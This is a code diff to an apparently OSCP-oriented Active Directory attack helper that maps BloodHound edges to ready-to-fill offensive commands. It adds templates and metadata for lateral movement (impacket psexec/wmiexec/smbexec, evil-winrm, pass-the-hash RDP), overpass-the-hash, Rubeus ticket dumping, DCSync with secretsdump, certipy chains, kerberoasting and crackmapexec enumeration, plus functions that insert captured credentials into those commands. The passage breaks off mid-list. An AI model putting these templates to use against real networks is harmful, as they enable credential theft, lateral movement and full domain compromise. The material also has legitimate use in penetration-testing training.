@@ -8,7 +8,293 @@ DRY mapping system that:
 - Filters out invalid targets (groups misused as computers)
 """
 
+from dataclasses import dataclass
 from typing import Dict, List, Any, Optional
+
+
+# =============================================================================
+# LATERAL MOVEMENT TECHNIQUE METADATA (multi-technique per access type)
+# =============================================================================
+
+@dataclass
+class TechniqueInfo:
+    """
+    Lateral movement technique metadata for educational command suggestions.
+
+    Each technique provides multiple command templates (one per credential type)
+    along with OSCP-relevant context about when, why, and how to use it.
+    """
+    name: str                           # Human-readable technique name
+    command_templates: Dict[str, str]   # cred_type -> command template
+    ports: List[int]                    # Required network ports
+    requirements: List[str]             # Prerequisites for this technique
+    noise_level: str                    # Detection risk: low, medium, high
+    advantages: str                     # Why use this technique
+    disadvantages: str                  # Limitations / risks
+    oscp_relevance: str                 # OSCP exam relevance: high, medium, low
+
+
+# Multiple techniques available for each access type
+# Ordered by reliability/common usage (first is default)
+LATERAL_TECHNIQUES: Dict[str, List[TechniqueInfo]] = {
+    "AdminTo": [
+        TechniqueInfo(
+            name="PsExec (Impacket)",
+            command_templates={
+                "password": "impacket-psexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
+                "ntlm-hash": "impacket-psexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
+                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
+            },
+            ports=[445],
+            requirements=["SMB port 445 open", "ADMIN$ share accessible", "Local admin rights"],
+            noise_level="high",
+            advantages="Reliable, gets SYSTEM shell, works with hash/ticket",
+            disadvantages="Creates service, logged in Event Log, AV detection",
+            oscp_relevance="high",
+        ),
+        TechniqueInfo(
+            name="WMIExec (Impacket)",
+            command_templates={
+                "password": "impacket-wmiexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
+                "ntlm-hash": "impacket-wmiexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
+                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-wmiexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
+            },
+            ports=[135],
+            requirements=["RPC port 135 open", "WMI access", "Local admin rights"],
+            noise_level="medium",
+            advantages="No service creation, runs as user, uses WMI (legitimate)",
+            disadvantages="No SYSTEM shell, requires RPC, slower than PsExec",
+            oscp_relevance="high",
+        ),
+        TechniqueInfo(
+            name="SMBExec (Impacket)",
+            command_templates={
+                "password": "impacket-smbexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
+                "ntlm-hash": "impacket-smbexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
+                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-smbexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
+            },
+            ports=[445],
+            requirements=["SMB port 445 open", "ADMIN$ share accessible", "Local admin rights"],
+            noise_level="high",
+            advantages="SYSTEM shell, creates fewer artifacts than PsExec",
+            disadvantages="Service creation, Event Log entries, AV detection",
+            oscp_relevance="medium",
+        ),
+        TechniqueInfo(
+            name="DCOMExec (Impacket)",
+            command_templates={
+                "password": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
+                "ntlm-hash": "impacket-dcomexec -object MMC20 -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
+                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-dcomexec -object MMC20 -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
+            },
+            ports=[135],
+            requirements=["RPC port 135 open", "DCOM enabled", "Local admin rights"],
+            noise_level="medium",
+            advantages="Uses DCOM (often overlooked), runs as user",
+            disadvantages="Requires RPC, less reliable than PsExec/WMI",
+            oscp_relevance="medium",
+        ),
+    ],
+    "CanPSRemote": [
+        TechniqueInfo(
+            name="Evil-WinRM",
+            command_templates={
+                "password": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
+                "ntlm-hash": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
+                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
+            },
+            ports=[5985, 5986],
+            requirements=["WinRM port 5985/5986 open", "Remote Management Users group"],
+            noise_level="low",
+            advantages="Interactive PowerShell, file upload/download, stealthy",
+            disadvantages="Requires WinRM, may need Remote Management Users membership",
+            oscp_relevance="high",
+        ),
+        TechniqueInfo(
+            name="WinRS (Windows)",
+            command_templates={
+                "password": "winrs -r:<TARGET> -u:<DOMAIN>\\<USERNAME> -p:<CRED_VALUE> cmd",
+            },
+            ports=[5985, 5986],
+            requirements=["WinRM port 5985/5986 open", "Windows client", "Remote Management Users group"],
+            noise_level="low",
+            advantages="Native Windows, no extra tools, trusted binary",
+            disadvantages="Windows-only, less interactive than Evil-WinRM",
+            oscp_relevance="medium",
+        ),
+    ],
+    "CanRDP": [
+        TechniqueInfo(
+            name="xfreerdp",
+            command_templates={
+                "password": "xfreerdp /v:<TARGET> /u:<USERNAME> /p:'<CRED_VALUE>' /d:<DOMAIN> +clipboard",
+                "ntlm-hash": "xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<CRED_VALUE> /d:<DOMAIN> +clipboard",
+            },
+            ports=[3389],
+            requirements=["RDP port 3389 open", "Remote Desktop Users or Administrators group"],
+            noise_level="low",
+            advantages="Full GUI access, file transfer, clipboard sharing",
+            disadvantages="Visible session (noisy), may disconnect other users",
+            oscp_relevance="high",
+        ),
+        TechniqueInfo(
+            name="rdesktop",
+            command_templates={
+                "password": "rdesktop -u <USERNAME> -p '<CRED_VALUE>' -d <DOMAIN> <TARGET>",
+            },
+            ports=[3389],
+            requirements=["RDP port 3389 open", "Remote Desktop Users or Administrators group"],
+            noise_level="low",
+            advantages="Lightweight, works on older systems",
+            disadvantages="Fewer features than xfreerdp, password only",
+            oscp_relevance="low",
+        ),
+    ],
+    "ExecuteDCOM": [
+        TechniqueInfo(
+            name="DCOMExec (MMC20)",
+            command_templates={
+                "password": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
+                "ntlm-hash": "impacket-dcomexec -object MMC20 -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
+                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-dcomexec -object MMC20 -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
+            },
+            ports=[135],
+            requirements=["RPC port 135 open", "DCOM enabled", "Local admin or DCOM permission"],
+            noise_level="medium",
+            advantages="Uses MMC20 Application COM object, often overlooked",
+            disadvantages="Requires RPC, may be blocked by firewall",
+            oscp_relevance="medium",
+        ),
+    ],
+}
+
+
+# =============================================================================
+# CREDENTIAL CONVERSION ATTACKS (Overpass the Hash)
+# =============================================================================
+
+# When user has NTLM hash but target requires Kerberos authentication
+# Converts NTLM hash to Kerberos TGT for environments blocking NTLM
+CREDENTIAL_CONVERSION: Dict[str, TechniqueInfo] = {
+    "overpass-the-hash": TechniqueInfo(
+        name="Overpass the Hash (NTLM → TGT)",
+        command_templates={
+            "ntlm-hash": "impacket-getTGT -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'",
+        },
+        ports=[88],
+        requirements=["Kerberos port 88 reachable", "Valid NTLM hash", "User account not disabled"],
+        noise_level="low",
+        advantages="Converts hash to TGT for Kerberos-only targets, evades NTLM monitoring",
+        disadvantages="Requires Kerberos access, TGT expires (10h default)",
+        oscp_relevance="high",
+    ),
+}
+
+
+# =============================================================================
+# TICKET ATTACKS (Pass the Ticket)
+# =============================================================================
+
+# Using/importing Kerberos tickets for authentication
+TICKET_ATTACKS: Dict[str, TechniqueInfo] = {
+    "export-tickets": TechniqueInfo(
+        name="Export Kerberos Tickets (Rubeus)",
+        command_templates={
+            # Windows - run on compromised host with session
+            "session": "Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap",
+        },
+        ports=[],
+        requirements=["Local admin on host with target session", "Target logged in"],
+        noise_level="medium",
+        advantages="Extract tickets for offline use, enables pass-the-ticket",
+        disadvantages="Requires session on target, may trigger EDR",
+        oscp_relevance="high",
+    ),
+    "pass-the-ticket": TechniqueInfo(
+        name="Pass the Ticket (ccache)",
+        command_templates={
+            "kerberos-ticket": "export KRB5CCNAME=<CRED_VALUE>",
+        },
+        ports=[88],
+        requirements=["Valid ccache file", "Ticket not expired", "Matching SPN"],
+        noise_level="low",
+        advantages="Reuse captured tickets, no hash needed, avoids password cracking",
+        disadvantages="Tickets expire, need correct service ticket",
+        oscp_relevance="high",
+    ),
+    "convert-kirbi-ccache": TechniqueInfo(
+        name="Convert .kirbi to .ccache",
+        command_templates={
+            "kirbi-file": "impacket-ticketConverter <CRED_VALUE> <OUTPUT>.ccache",
+        },
+        ports=[],
+        requirements=["Valid .kirbi file from Rubeus/Mimikatz"],
+        noise_level="low",
+        advantages="Convert Windows tickets to Linux format",
+        disadvantages="Requires initial ticket extraction",
+        oscp_relevance="medium",
+    ),
+}
+
+
+# =============================================================================
+# HELPER FUNCTIONS FOR LATERAL TECHNIQUES
+# =============================================================================
+
+def get_techniques_for_access(access_type: str) -> List[TechniqueInfo]:
+    """
+    Get all available lateral movement techniques for an access type.
+
+    Args:
+        access_type: BloodHound edge type (AdminTo, CanPSRemote, etc.)
+
+    Returns:
+        List of TechniqueInfo objects, ordered by reliability
+    """
+    return LATERAL_TECHNIQUES.get(access_type, [])
+
+
+def get_technique_command(
+    access_type: str,
+    cred_type: str,
+    technique_index: int = 0
+) -> Optional[str]:
+    """
+    Get command template for a specific technique and credential type.
+
+    Args:
+        access_type: BloodHound edge type
+        cred_type: password, ntlm-hash, kerberos-ticket
+        technique_index: Which technique to use (0 = default/first)
+
+    Returns:
+        Command template string or None
+    """
+    techniques = LATERAL_TECHNIQUES.get(access_type, [])
+    if not techniques or technique_index >= len(techniques):
+        return None
+    return techniques[technique_index].command_templates.get(cred_type)
+
+
+def needs_overpass_the_hash(cred_type: str, target_ports: List[int]) -> bool:
+    """
+    Determine if Overpass the Hash is needed.
+
+    Needed when:
+    - User has NTLM hash
+    - Target only accepts Kerberos (port 88 open, 445 closed)
+
+    Args:
+        cred_type: Current credential type
+        target_ports: List of open ports on target
+
+    Returns:
+        True if Overpass the Hash should be suggested
+    """
+    if cred_type != "ntlm-hash":
+        return False
+    # If SMB is blocked but Kerberos is available
+    return 88 in target_ports and 445 not in target_ports
 
 
 # =============================================================================
@@ -27,14 +313,14 @@ from typing import Dict, List, Any, Optional
 QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
     # ==================== LATERAL MOVEMENT (Array fields) ====================
     "lateral-adminto-nonpriv": {
-        "commands": ["psexec-shell", "wmiexec-shell", "smbexec-shell"],
+        "commands": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
         "access_type": "AdminTo",
         "array_field": "AdminOnComputers",
         "user_field": "User",
         "permissions_required": "Local admin on target (AdminTo edge)",
     },
     "lateral-all-admins-per-computer": {
-        "commands": ["psexec-shell"],
+        "commands": ["impacket-psexec"],
         "access_type": "AdminTo",
         "array_field": "LocalAdmins",  # Users who can admin
         "target_field": "Computer",     # Single computer per row
@@ -56,14 +342,14 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "permissions_required": "Remote Management Users or Administrators group",
     },
     "lateral-dcom-targets": {
-        "commands": ["wmiexec-shell"],
+        "commands": ["impacket-wmiexec"],
         "access_type": "ExecuteDCOM",
         "array_field": "DCOMTargets",
         "user_field": "User",
         "permissions_required": "DCOM execution rights on target",
     },
     "lateral-da-sessions-workstations": {
-        "commands": ["psexec-shell"],
+        "commands": ["impacket-psexec"],
         "access_type": "HasSession",
         "target_field": "Workstation",
         "array_field": "PrivilegedSessions",  # Who's logged in
@@ -71,7 +357,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "permissions_required": "Local admin on workstation to dump creds",
     },
     "lateral-sessions-on-computer": {
-        "commands": ["psexec-shell"],
+        "commands": ["impacket-psexec"],
         "access_type": "HasSession",
         "target_field": "Computer",
         "user_field": "LoggedOnUser",
@@ -79,20 +365,20 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "permissions_required": "Local admin on target to dump creds",
     },
     "lateral-user-access-all": {
-        "commands": ["psexec-shell", "evil-winrm-shell", "xfreerdp-connect"],
+        "commands": ["impacket-psexec", "evil-winrm-shell", "xfreerdp-connect"],
         "target_field": "Target",
         "access_type_field": "AccessType",  # Dynamic: AdminTo|CanRDP|CanPSRemote
         "permissions_required": "Varies by access type (AdminTo/CanRDP/CanPSRemote)",
     },
     "lateral-domain-users-admin": {
-        "commands": ["psexec-shell"],
+        "commands": ["impacket-psexec"],
         "access_type": "AdminTo",
         "target_field": "Computer",
         "context": "Domain Users = local admin (any user can compromise)",
         "permissions_required": "Any domain user (misconfigured local admin)",
     },
     "lateral-da-sessions": {
-        "commands": ["psexec-shell"],
+        "commands": ["impacket-psexec"],
         "access_type": "HasSession",
         "target_field": "Computer",
         "context": "DA session - prime mimikatz target",
@@ -103,7 +389,8 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
     "quick-asrep-roastable": {
         "commands": ["impacket-getnpusers-asreproast"],
         "access_type": None,  # No lateral access check
-        "discovery_command": True,  # Enumerates targets, uses attacker creds
+        "discovery_command": True,  # Enumerates targets
+        "auth_free": True,  # Discovered user IS the command target, no attacker auth needed
         "target_field": "User",  # What we discovered
         "context": "AS-REP roast - no auth required",
         "permissions_required": "None (pre-auth disabled on target)",
@@ -214,7 +501,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "permissions_required": "GenericWrite on target user",
     },
     "privesc-add-member": {
-        "commands": ["psexec-shell"],
+        "commands": ["impacket-psexec"],
         "access_type": "AddMember",
         "user_field": "Attacker",
         "target_field": "Group",
@@ -240,26 +527,26 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
 
     # ==================== OWNED PRINCIPAL ====================
     "owned-what-can-access": {
-        "commands": ["psexec-shell", "evil-winrm-shell", "xfreerdp-connect"],
+        "commands": ["impacket-psexec", "evil-winrm-shell", "xfreerdp-connect"],
         "target_field": "Target",
         "access_type_field": "AccessType",  # Dynamic from query result
         "permissions_required": "Owned user credentials + their access rights",
     },
     "owned-path-to-da": "BUILD_SEQUENCE",
     "owned-first-hop": {
-        "commands": ["psexec-shell", "evil-winrm-shell"],
+        "commands": ["impacket-psexec", "evil-winrm-shell"],
         "target_field": "Target",
         "access_type_field": "AccessType",
         "permissions_required": "Owned user credentials + their access rights",
     },
     "owned-admin-on": {
-        "commands": ["psexec-shell", "wmiexec-shell"],
+        "commands": ["impacket-psexec", "impacket-wmiexec"],
         "access_type": "AdminTo",
         "target_field": "Target",
         "permissions_required": "Owned user with AdminTo on target",
     },
     "owned-cred-harvest-targets": {
-        "commands": ["psexec-shell"],
+        "commands": ["impacket-psexec"],
         "access_type": "HasSession",
         "target_field": "Computer",
         "context": "Credential harvest from DA session",
@@ -517,7 +804,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "permissions_required": "Network access to target + listener on unconstrained host",
     },
     "lateral-sid-history": {
-        "commands": ["psexec-shell", "wmiexec-shell"],
+        "commands": ["impacket-psexec", "impacket-wmiexec"],
         "access_type": "HasSIDHistory",
         "user_field": "Principal",
         "target_field": "HasSIDOf",
@@ -525,7 +812,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "permissions_required": "Control of principal with SID history",
     },
     "lateral-trust-abuse": {
-        "commands": ["psexec-shell"],
+        "commands": ["impacket-psexec"],
         "access_type": "TrustedBy",
         "user_field": "TrustingDomain",
         "target_field": "TrustedDomain",
@@ -616,16 +903,206 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
 
 
 # =============================================================================
+# CREDENTIAL TYPE -> COMMAND MAPPINGS (for pwned user follow-up)
+# =============================================================================
+
+# Maps credential type + access type to appropriate command IDs
+# Used by pwned_tracker to generate copy-paste ready commands
+
+CRED_TYPE_COMMANDS: Dict[str, Dict[str, List[str]]] = {
+    "password": {
+        "AdminTo": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
+        "CanRDP": ["xfreerdp-connect"],
+        "CanPSRemote": ["evil-winrm-shell"],
+        "ExecuteDCOM": ["impacket-wmiexec"],
+        "DCSync": ["ad-dcsync-impacket-secretsdump-user"],
+    },
+    "ntlm-hash": {
+        "AdminTo": ["psexec-pth", "wmiexec-pth", "smbexec-pth"],
+        "CanRDP": ["xfreerdp-pth"],
+        "CanPSRemote": ["evil-winrm-hash"],
+        "ExecuteDCOM": ["wmiexec-pth"],
+        "DCSync": ["ad-dcsync-impacket-secretsdump-hash"],
+    },
+    "kerberos-ticket": {
+        "AdminTo": ["psexec-kerberos", "wmiexec-kerberos"],
+        "CanRDP": ["xfreerdp-kerberos"],
+        "CanPSRemote": ["evil-winrm-kerberos"],
+        "ExecuteDCOM": ["wmiexec-kerberos"],
+        "DCSync": ["ad-dcsync-impacket-secretsdump-kerberos"],
+    },
+    "certificate": {
+        "AdminTo": ["certipy-auth-pth"],
+        "CanRDP": ["certipy-auth-rdp"],
+        "CanPSRemote": ["certipy-auth-winrm"],
+        "DCSync": ["certipy-auth-dcsync"],
+    },
+}
+
+
+# Command templates by credential type (with auto-fill placeholders)
+# These are the actual command strings with credential placeholders filled
+CRED_TYPE_TEMPLATES: Dict[str, Dict[str, str]] = {
+    "password": {
+        "AdminTo": "impacket-psexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
+        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /p:'<CRED_VALUE>' /d:<DOMAIN>",
+        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
+        "DCSync": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<DC_IP>",
+        "secretsdump": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
+    },
+    "ntlm-hash": {
+        "AdminTo": "impacket-psexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
+        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<CRED_VALUE> /d:<DOMAIN>",
+        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
+        "DCSync": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<DC_IP>",
+        "secretsdump": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
+    },
+    "kerberos-ticket": {
+        "AdminTo": "KRB5CCNAME=<CRED_VALUE> impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
+        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /d:<DOMAIN> /kerberos",
+        "CanPSRemote": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
+        "DCSync": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<DC_IP>",
+        "secretsdump": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
+    },
+    "certificate": {
+        "AdminTo": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-psexec -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<TARGET>",
+        "CanRDP": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<NTLM>",
+        "CanPSRemote": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && evil-winrm -i <TARGET> -u <USERNAME> -H <NTLM>",
+        "DCSync": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-secretsdump -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<DC_IP>",
+    },
+}
+
+
+def get_commands_for_cred_type(cred_type: str, access_type: str) -> List[str]:
+    """
+    Get command IDs for a credential type and access type combination.
+
+    Args:
+        cred_type: password, ntlm-hash, kerberos-ticket, certificate
+        access_type: AdminTo, CanRDP, CanPSRemote, etc.
+
+    Returns:
+        List of command IDs
+    """
+    return CRED_TYPE_COMMANDS.get(cred_type, {}).get(access_type, [])
+
+
+def get_command_template(cred_type: str, access_type: str) -> Optional[str]:
+    """
+    Get ready-to-fill command template for credential type and access type.
+
+    Args:
+        cred_type: password, ntlm-hash, kerberos-ticket, certificate
+        access_type: AdminTo, CanRDP, CanPSRemote, etc.
+
+    Returns:
+        Command template string with placeholders
+    """
+    return CRED_TYPE_TEMPLATES.get(cred_type, {}).get(access_type)
+
+
+def fill_command(
+    template: str,
+    username: str = "",
+    target: str = "",
+    domain: str = "",
+    dc_ip: str = "",
+    password: str = "",
+    ntlm_hash: str = "",
+    cred_value: str = "",
+) -> str:
+    """
+    Universal command placeholder filler.
+
+    Fills all standard placeholders plus optional credentials.
+    Credentials only fill if non-empty string provided.
+
+    Args:
+        template: Command template with <PLACEHOLDERS>
+        username: Username (UPN format OK - will extract just username)
+        target: Target computer FQDN
+        domain: Domain name
+        dc_ip: Domain controller IP/hostname (auto-inferred if not provided)
+        password: Password credential (fills <PASSWORD>)
+        ntlm_hash: NTLM hash credential (fills <HASH>, <NTLM_HASH>)
+        cred_value: Generic credential value (fills <CRED_VALUE>)
+
+    Returns:
+        Filled command string
+    """
+    result = template
+
+    # === User placeholders ===
+    if username:
+        # Handle UPN format (MIKE@CORP.COM -> MIKE)
+        clean_user = extract_username(username) if "@" in username else username
+        result = result.replace("<USERNAME>", clean_user)
+        result = result.replace("<USER>", clean_user)
+
+    # === Target placeholders ===
+    if target:
+        result = result.replace("<TARGET>", target)
+        result = result.replace("<COMPUTER>", target)
+
+    # === Domain placeholders ===
+    if domain:
+        result = result.replace("<DOMAIN>", domain.lower())
+
+    # === DC placeholders ===
+    dc = dc_ip or (infer_dc_hostname(domain) if domain else "")
+    if dc:
+        result = result.replace("<DC_IP>", dc)
+        result = result.replace("<DC>", dc)
+
+    # === Credential placeholders (only if provided) ===
+    if password:
+        result = result.replace("<PASSWORD>", password)
+
+    if ntlm_hash:
+        result = result.replace("<HASH>", ntlm_hash)
+        result = result.replace("<NTLM_HASH>", ntlm_hash)
+
+    if cred_value:
+        result = result.replace("<CRED_VALUE>", cred_value)
+
+    return result
+
+
+def fill_pwned_command(
+    template: str,
+    username: str,
+    domain: str,
+    target: str,
+    cred_value: str,
+    dc_ip: Optional[str] = None
+) -> str:
+    """
+    Fill a command template with pwned user credentials.
+
+    DEPRECATED: Use fill_command() instead for new code.
+    This function is kept for backward compatibility.
+    """
+    return fill_command(
+        template=template,
+        username=username,
+        domain=domain,
+        target=target,
+        dc_ip=dc_ip or "",
+        cred_value=cred_value,
+    )
+
+
+# =============================================================================
 # EDGE TYPE -> COMMAND MAPPINGS (for attack sequence building)
 # =============================================================================
 
 EDGE_COMMAND_MAPPINGS: Dict[str, List[str]] = {
     # Access Edges
-    "AdminTo": ["psexec-shell", "wmiexec-shell", "smbexec-shell"],
+    "AdminTo": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
     "CanRDP": ["xfreerdp-connect"],
     "CanPSRemote": ["evil-winrm-shell"],
-    "ExecuteDCOM": ["wmiexec-shell"],
-    "HasSession": ["psexec-shell"],  # Get shell to harvest creds
+    "ExecuteDCOM": ["impacket-wmiexec"],
+    "HasSession": ["impacket-psexec"],  # Get shell to harvest creds
 
     # Permission Edges (ACL abuse)
     # Note: bloodyad-genericall, dacledit, owneredit, net-group-add not yet in DB
@@ -678,8 +1155,8 @@ EDGE_COMMAND_MAPPINGS: Dict[str, List[str]] = {
     "CoerceToTGT": ["petitpotam-coerce", "coercer-coerce", "printerbug-trigger", "dfscoerce-trigger"],
 
     # SID/Trust Edges
-    "HasSIDHistory": ["psexec-shell", "wmiexec-shell"],
-    "TrustedBy": ["psexec-shell"],
+    "HasSIDHistory": ["impacket-psexec", "impacket-wmiexec"],
+    "TrustedBy": ["impacket-psexec"],
 
     # Other PrivEsc Edges
     "WriteSPN": ["impacket-getuserspns-kerberoast"],
@@ -1003,3 +1480,172 @@ def get_reason(
         return f"{access_type} relationship"
 
     return "BloodHound finding"
+
+
+# =============================================================================
+# AUTHENTICATED USER ATTACKS (any domain user can run)
+# =============================================================================
+
+# Templates for attacks that ANY authenticated domain user can run
+# These don't require specific BloodHound edges - just valid domain creds
+AUTHENTICATED_USER_TEMPLATES: Dict[str, Dict[str, str]] = {
+    "password": {
+        # Credential Attacks (High Priority)
+        "asrep-roast": "impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request",
+        "kerberoast": "impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request",
+        # BloodHound Collection
+        "bloodhound": "bloodhound-python -c all -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <DC_IP>",
+        # User/Group Enumeration
+        "enum-users": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --users",
+        "enum-groups": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M groupmembership -o GROUP='Domain Admins'",
+        # Share/Resource Enumeration
+        "enum-shares": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --shares",
+        "enum-computers": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --computers",
+        # Policy/Config Enumeration
+        "enum-passpol": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol",
+        "enum-gpos": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo",
+        "enum-trusts": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts",
+    },
+    "ntlm-hash": {
+        "asrep-roast": "impacket-GetNPUsers '<DOMAIN>/<USERNAME>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request",
+        "kerberoast": "impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request",
+        "bloodhound": "bloodhound-python -c all -u <USERNAME> --hashes :<NTLM_HASH> -d <DOMAIN> -dc <DC_IP>",
+        "enum-users": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --users",
+        "enum-shares": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --shares",
+        "enum-computers": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --computers",
+        "enum-passpol": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --pass-pol",
+    },
+    "kerberos-ticket": {
+        "asrep-roast": "KRB5CCNAME=<CCACHE_FILE> impacket-GetNPUsers '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <DC_IP>",
+        "kerberoast": "KRB5CCNAME=<CCACHE_FILE> impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <DC_IP> -request",
+        "bloodhound": "KRB5CCNAME=<CCACHE_FILE> bloodhound-python -c all -u <USERNAME> -k -d <DOMAIN> -dc <DC_IP>",
+    },
+}
+
+# Attack metadata for display (organized by priority and category)
+AUTHENTICATED_ATTACKS: List[Dict[str, str]] = [
+    # === CREDENTIAL ATTACKS (High Priority) ===
+    {
+        "id": "asrep-roast",
+        "name": "AS-REP Roasting",
+        "category": "Credential Attacks",
+        "objective": "Find users with DONT_REQUIRE_PREAUTH, get crackable hash",
+        "rewards": "Credentials of AS-REP roastable users",
+        "requires": "Any authenticated domain user",
+        "priority": "high",
+    },
+    {
+        "id": "kerberoast",
+        "name": "Kerberoasting",
+        "category": "Credential Attacks",
+        "objective": "Get TGS tickets for service accounts, crack offline",
+        "rewards": "Service account credentials (often privileged)",
+        "requires": "Any authenticated domain user",
+        "priority": "high",
+    },
+    # === BLOODHOUND (Recommended) ===
+    {
+        "id": "bloodhound",
+        "name": "BloodHound Collection",
+        "category": "Graph Collection",
+        "objective": "Collect domain data for attack path analysis",
+        "rewards": "Complete attack path visualization, missed edges",
+        "requires": "Any authenticated domain user",
+        "priority": "high",
+    },
+    # === USER/GROUP ENUMERATION ===
+    {
+        "id": "enum-users",
+        "name": "Domain User Enumeration",
+        "category": "User Enumeration",
+        "objective": "Enumerate all domain users for targeting",
+        "rewards": "User list for password spraying, pattern analysis",
+        "requires": "Any authenticated domain user",
+        "priority": "medium",
+    },
+    {
+        "id": "enum-groups",
+        "name": "Domain Admins Members",
+        "category": "User Enumeration",
+        "objective": "Identify Domain Admin group members",
+        "rewards": "High-value targets for credential attacks",
+        "requires": "Any authenticated domain user",
+        "priority": "medium",
+    },
+    # === RESOURCE ENUMERATION ===
+    {
+        "id": "enum-shares",
+        "name": "Share Enumeration",
+        "category": "Resource Enumeration",
+        "objective": "Enumerate accessible SMB shares",
+        "rewards": "Sensitive files, credentials, configuration data",
+        "requires": "Any authenticated domain user",
+        "priority": "medium",
+    },
+    {
+        "id": "enum-computers",
+        "name": "Computer Enumeration",
+        "category": "Resource Enumeration",
+        "objective": "List domain computers for lateral movement targets",
+        "rewards": "Target list for lateral movement, version info",
+        "requires": "Any authenticated domain user",
+        "priority": "medium",
